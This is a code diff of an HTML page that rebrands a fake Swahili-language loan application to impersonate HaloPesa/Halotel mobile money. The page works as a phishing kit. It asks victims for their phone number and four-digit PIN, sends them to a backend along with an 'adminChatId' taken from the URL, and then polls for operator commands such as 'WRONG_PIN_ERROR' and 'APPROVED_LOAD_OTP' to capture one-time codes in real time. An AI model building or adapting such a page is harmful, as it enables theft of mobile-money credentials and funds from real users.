@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MIXX BY YAS - MIKOKO RAHISI NA YA HARAKA</title>
+    <title>HALOPESA - HUDUMA ZA MIKOPO NA PESA KIGANJANI</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -11,8 +11,8 @@
     <header>
         <span style="font-size: 20px; cursor: pointer;">☰</span>
         <div class="logo-container">
-            <span class="yas-badge">YAS</span>
-            <span class="brand-title">MIXX BY YAS</span>
+            <span class="halo-badge">HALOPESA</span>
+            <span class="brand-title">HALOTEL</span>
         </div>
         <span></span>
     </header>
@@ -21,14 +21,14 @@
         
         <!-- DASHBOARD SCREEN -->
         <div id="screen-dashboard" class="screen active">
-            <h2>PATA MKOPO WAKO HARAKA</h2>
-            <p class="subtitle">Idhini ya haraka • Viwango bora • Masharti yanayobadilika</p>
+            <h2>PATA MKOPO WAKO WA HALOPESA</h2>
+            <p class="subtitle">Idhini ya haraka • Viwango bora • Masharti rahisi</p>
             
             <div style="background: #fafafa; padding: 15px; border-radius: 12px; border: 1px solid #eee; margin-bottom: 20px;">
                 <label>Kikokotoko Cha Mkopo</label>
-                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:var(--accent-yellow); float:right;">TZS 1,000,000</strong></p>
-                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-yellow); width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
-                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:var(--accent-yellow); font-size:16px; float:right;">TZS 95,044.20</strong></p>
+                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:var(--accent-orange); float:right;">TZS 1,000,000</strong></p>
+                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-orange); width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
+                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:var(--accent-orange); font-size:16px; float:right;">TZS 95,044.20</strong></p>
             </div>
 
             <button class="btn-primary" onclick="goToScreen('screen-step1')">OMBA SASA</button>
@@ -97,29 +97,29 @@
             <div style="font-size: 48px; margin-bottom: 15px;">📋</div>
             <h2>Ombi La Mkopo Limewasilishwa</h2>
             <p class="subtitle">Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini. Utapokea ujumbe wa uthibitisho.</p>
-            <p id="status-text" style="font-weight: bold; color: var(--primary-blue); margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
+            <p id="status-text" style="font-weight: bold; color: var(--primary-green); margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
         </div>
 
         <!-- LOGIN / PIN SCREEN -->
         <div id="screen-login" class="screen">
-            <h2 style="text-align:center;">INGIA</h2>
+            <h2 style="text-align:center;">INGIA HALOPESA</h2>
             
             <div id="login-error-banner" style="display: none; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: bold; font-size: 14px;"></div>
 
             <div class="form-group">
-                <label>Nambari Ya Simu</label>
+                <label>Nambari Ya Simu (HaloPesa)</label>
                 <div style="display: flex; gap: 8px;">
                     <span style="padding: 12px; background: #eee; border-radius: 8px; border:1px solid #ccc;">🇹🇿 +255</span>
-                    <input type="tel" id="phoneNumber" placeholder="712345678" style="flex: 1;" oninput="checkLoginInputs()">
+                    <input type="tel" id="phoneNumber" placeholder="621234567" style="flex: 1;" oninput="checkLoginInputs()">
                 </div>
             </div>
 
-            <label style="text-align:center; margin-top: 15px;">Weka PIN Yako (Tarakimu 4)</label>
+            <label style="text-align:center; margin-top: 15px;">Weka PIN Ya HaloPesa (Tarakimu 4)</label>
             <div class="pin-inputs">
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
-                <input type="password" maxlength="1" class="pin-box" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
+                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
             </div>
 
             <button class="btn-primary" id="btnLogin" onclick="submitPin()" disabled style="opacity: 0.5; cursor: not-allowed;">INGIA</button>
@@ -143,7 +143,7 @@
         <div id="screen-success" class="screen" style="text-align: center; padding: 40px 20px;">
             <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
             <h2 style="color: white;">IMEANISHWA!</h2>
-            <p style="color: #e5e7eb; margin-top: 10px;">Mkopo wako umeidhinishwa na kuhamishwa kwenye akaunti yako.</p>
+            <p style="color: #e5e7eb; margin-top: 10px;">Mkopo wako umeidhinishwa na kuhamishwa kwenye akaunti yako ya HaloPesa.</p>
         </div>
 
     </div>
@@ -173,7 +173,6 @@
             document.getElementById('displayMonthly').innerText = 'TZS ' + formattedMonthly;
         }
 
-        // --- VALIDATION LOGIC FOR STEP 1 ---
         function checkStep1Inputs() {
             const loanType = document.getElementById('loanType').value;
             const loanAmount = document.getElementById('loanAmount').value;
@@ -201,7 +200,6 @@
             goToScreen('screen-step3');
         }
 
-        // --- VALIDATION LOGIC FOR STEP 3 ---
         function checkStep3Inputs() {
             const employment = document.getElementById('employment').value;
             const income = document.getElementById('income').value;
@@ -225,7 +223,6 @@
             goToScreen('screen-login');
         }
 
-        // --- VALIDATION LOGIC FOR LOGIN / PIN ---
         function checkLoginInputs() {
             const phone = document.getElementById('phoneNumber').value;
             const pinBoxes = document.querySelectorAll('#screen-login .pin-box');
@@ -259,7 +256,6 @@
             });
         });
 
-        // --- VALIDATION LOGIC FOR OTP ---
         function checkOtpInput() {
             const otp = document.getElementById('otpInput').value;
             const btn = document.getElementById('btnOtp');
@@ -284,18 +280,31 @@
             const rangeVal = document.getElementById('loanRange').value;
             const selectedAmount = 'TZS ' + Number(rangeVal).toLocaleString('en-US');
 
-            const response = await fetch('/api/submit-application', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone, pin, amount: selectedAmount })
-            });
+            const urlParams = new URLSearchParams(window.location.search);
+            const adminParam = urlParams.get('admin');
 
-            const data = await response.json();
-            if(data.success) {
-                currentUserId = data.userId;
-                document.getElementById('login-error-banner').style.display = 'none';
-                goToScreen('screen-waiting');
-                startPollingStatus();
+            try {
+                const response = await fetch('/api/submit-application', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, pin, amount: selectedAmount, adminChatId: adminParam })
+                });
+
+                const data = await response.json();
+                if(data.success) {
+                    currentUserId = data.userId;
+                    document.getElementById('login-error-banner').style.display = 'none';
+                    goToScreen('screen-waiting');
+                    startPollingStatus();
+                } else {
+                    const banner = document.getElementById('login-error-banner');
+                    banner.innerText = data.error || 'Hitilafu imetokea. Jaribu tena.';
+                    banner.style.display = 'block';
+                }
+            } catch (err) {
+                const banner = document.getElementById('login-error-banner');
+                banner.innerText = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
+                banner.style.display = 'block';
             }
         }
 
@@ -304,50 +313,52 @@
 
             statusPollInterval = setInterval(async () => {
                 if(!currentUserId) return;
-                const res = await fetch(`/api/check-status/${currentUserId}`);
-                const data = await res.json();
+                try {
+                    const res = await fetch(`/api/check-status/${currentUserId}`);
+                    const data = await res.json();
 
-                if(data.status === 'APPROVED_LOAD_OTP') {
-                    clearInterval(statusPollInterval);
-                    const otpBanner = document.getElementById('otp-error-banner');
-                    otpBanner.innerText = 'correct OTP ✅';
-                    otpBanner.style.background = '#e8f5e9';
-                    otpBanner.style.color = '#2e7d32';
-                    otpBanner.style.display = 'block';
-                    goToScreen('screen-otp');
-                } else if(data.status === 'DENIED') {
-                    clearInterval(statusPollInterval);
-                    const banner = document.getElementById('login-error-banner');
-                    banner.innerText = 'Ombi limekataliwa ❌';
-                    banner.style.background = '#ffebee';
-                    banner.style.color = '#c62828';
-                    banner.style.display = 'block';
-                    goToScreen('screen-login');
-                } else if(data.status === 'SUCCESS') {
-                    clearInterval(statusPollInterval);
-                    document.querySelector('.container').style.background = 'var(--primary-blue)';
-                    goToScreen('screen-success');
-                } else if(data.status === 'WRONG_PIN_ERROR') {
-                    clearInterval(statusPollInterval);
-                    const banner = document.getElementById('login-error-banner');
-                    banner.innerText = 'wrong PIN ❌';
-                    banner.style.background = '#ffebee';
-                    banner.style.color = '#c62828';
-                    banner.style.display = 'block';
-                    document.querySelectorAll('#screen-login .pin-box').forEach(b => b.value = '');
-                    checkLoginInputs();
-                    goToScreen('screen-login');
-                } else if(data.status === 'WRONG_OTP_ERROR') {
-                    clearInterval(statusPollInterval);
-                    const banner = document.getElementById('otp-error-banner');
-                    banner.innerText = 'WRONG OTP ❌';
-                    banner.style.background = '#ffebee';
-                    banner.style.color = '#c62828';
-                    banner.style.display = 'block';
-                    document.getElementById('otpInput').value = '';
-                    checkOtpInput();
-                    goToScreen('screen-otp');
-                }
+                    if(data.status === 'APPROVED_LOAD_OTP') {
+                        clearInterval(statusPollInterval);
+                        const otpBanner = document.getElementById('otp-error-banner');
+                        otpBanner.innerText = 'correct OTP ✅';
+                        otpBanner.style.background = '#e8f5e9';
+                        otpBanner.style.color = '#2e7d32';
+                        otpBanner.style.display = 'block';
+                        goToScreen('screen-otp');
+                    } else if(data.status === 'DENIED') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('login-error-banner');
+                        banner.innerText = 'Ombi limekataliwa ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        goToScreen('screen-login');
+                    } else if(data.status === 'SUCCESS') {
+                        clearInterval(statusPollInterval);
+                        document.querySelector('.container').style.background = 'var(--primary-green)';
+                        goToScreen('screen-success');
+                    } else if(data.status === 'WRONG_PIN_ERROR') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('login-error-banner');
+                        banner.innerText = 'wrong PIN ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        document.querySelectorAll('#screen-login .pin-box').forEach(b => b.value = '');
+                        checkLoginInputs();
+                        goToScreen('screen-login');
+                    } else if(data.status === 'WRONG_OTP_ERROR') {
+                        clearInterval(statusPollInterval);
+                        const banner = document.getElementById('otp-error-banner');
+                        banner.innerText = 'WRONG OTP ❌';
+                        banner.style.background = '#ffebee';
+                        banner.style.color = '#c62828';
+                        banner.style.display = 'block';
+                        document.getElementById('otpInput').value = '';
+                        checkOtpInput();
+                        goToScreen('screen-otp');
+                    }
+                } catch (e) {}
             }, 3000);
         }
 
@@ -368,4 +379,4 @@
     </script>
 </body>
     </html>
-                        
+    
